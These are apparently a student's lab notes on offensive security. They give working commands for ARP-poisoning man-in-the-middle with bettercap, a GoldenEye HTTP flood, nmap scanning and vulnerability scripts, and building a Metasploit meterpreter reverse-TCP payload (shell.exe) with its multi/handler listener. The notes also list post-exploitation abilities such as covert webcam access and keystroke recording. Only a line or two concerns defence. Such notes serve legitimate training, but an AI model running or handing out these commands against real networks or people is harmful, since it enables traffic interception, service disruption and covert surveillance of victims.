man in the middle attack using arp poisoning

arp poisoning:
  bettercap
  net.probe on // it scans machines on network
  net.show
  exit

  // tell kali to forward packages
  echo 1 > /proc/sys/net/ipv4/ip_forward
  echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects
  // stand between victim and router
  bettercap -eval "set arp.spoof.targets 192.168.0.108,192.168.0.1; set arp.spoof.fullduplex true;
    set arp.spoof.interval 10; arp.spoof on; net.sniff on"**
    // fullduplex means do spoof both directions

dos attack
  -volume based attacks - overwhelm bandwidth using udp, icmp, and spoofed-packet floods (measured in Bps).
  -protocol based: Exploit server resources and network infrastructure via SYN floods, Ping of Death, and Smurf DDoS (messured in Pps).
  -application based: Target web servers with GET/POST floods and low-and-slow attacks, appearing legitimate but causing creashes (measured in Rps).
  dos with GolenEye Demo:
    python3 -m http.server 8080
    python3 goldeneye.py http://192.168.0.135:8080

metasploitable:
  rapid7.com/products/metasploit/metasploitable
  download and unzip
  username and passsword: msfadmin
  go to virtual box and open (do not make a new virtual machine since we downloaded it)
  please note, go to network adapter and put the connection as host only so only main os can connect to it (do this for kali and metasploitable)

check ports
Nmap
  nmap -T 5 ipaddress -p 80 // 5 to do the scan aggressively, -p to only scan for this port
  nmap will try to scan for 15 minutes and then move to the next host
    -v verbosity // tells you what it is doing step by step

  you can put the ip addresses in file (each line is ip address)
  nmap -iL list.txt -p 80
  -oN, -oG, -oS, -oA and other options if we want to output the result
  nmap ipaddress -p 445 -oN o.txt

  network sweep
    nmap ipaddress -sP // check if the host is alive
    nmap ipaddress -p 445,80,22
  nmap check for top 1000 common used ports and not all ports
  nmap ipaddress -F // check common services only (fast, maybe 100 ports)

  nmap -sT ipAddress -p- // -p-0-5555

  common commands for nmap:
    namp -sV -p- ipaddress // scan all ports and attempt to detect service versions
    nmap -A -p- ipaddress // aggressive scan that includes OS detection, version detection, scrip scanning, and traceroute on all ports (-p-)
    nmap --script vuln* ipaddress // all scripts contining word vuln, so nmaps tries scripts that scans for vulnerabilities

blue team to detect nmap
  ips and ids
  ips // prevention system
  ids // detection system
  tool: snort

Command and Control (C2 or C&C)
  https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0

metasploit
  -msfconsole (primary command line interface)
  -payload (send him payload as malware)
  -auxiliary (any supporting modules as scanners, crawlers and fuzzers)
  commands:
  msfconsole
    payload
      search android // code that will run on the victim
    scanners or auxiliary module
      search ms17 // vulnerability in windows
      use 3 // enter scanner for option 3
      show options // ask what options he needs to run the scan

  msfvenom -p <payload> LHOST=<your_ip> LPORT=<your_port> -f <format> -o <filename> // anyport, if (exe, elf, raw), payload (traffic type(encrypted, not encrypted))
    -f vba (used to explot vulnerabilities in Microsoft Office documents  like word/excell macros)
    -f apk: for melicious android applications to exploit android devices
    msfvenom -p windows/meterpreter/reverse_tcp LHPST=my_ap_adress LPORT=4444 -f exe -o shell.exe

    now in metasploit
      use multi/handler
      show options
      set payload windows/meterpreter/reverse_tcp
      set LHOST
      set LPORT
      show options
      run

    now on windows execute payload.exe
    now I get session
      // post explotation
      command: screenshot, shell, download
      I can open the webcam without victim knowledge, manage files, record keystrokes
